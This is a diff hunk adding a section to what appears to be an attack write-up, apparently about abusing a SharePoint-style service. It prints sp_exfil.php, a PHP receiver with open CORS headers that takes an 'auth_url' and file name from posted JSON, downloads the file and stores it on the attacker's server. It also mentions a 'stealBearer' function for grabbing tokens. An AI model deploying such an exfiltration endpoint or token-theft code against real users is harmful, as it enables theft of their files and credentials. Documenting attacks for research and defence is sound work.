@@ -49,6 +49,25 @@ echo file_get_contents('http://REDACTED/tiny.png');
 
 ```
 
+### What is in sp_exfil.php
+Well it is less elegant that the above...I don't like this one, but it is referrenced in the JavaScript.
+
+```
+<?php
+header("Access-Control-Allow-Origin: *");
+header("Access-Control-Allow-Headers: *");
+header("Access-Control-Allow-Methods: *");
+header('Content-Type: application/json');
+
+$data = json_decode(file_get_contents('php://input'), true);
+$url = $data["auth_url"];
+$file_name = $data["name"];
+echo './REDACTED/'.$file_name;
+file_put_contents('./REDACTED/'.$file_name, file_get_contents($url));  
+?>
+
+```
+
 ## Upload and Delete
 The Upload and Delete required obtaining tokens from another requests This can be seen in the following function calls of delete_files.js
 - stealBearer
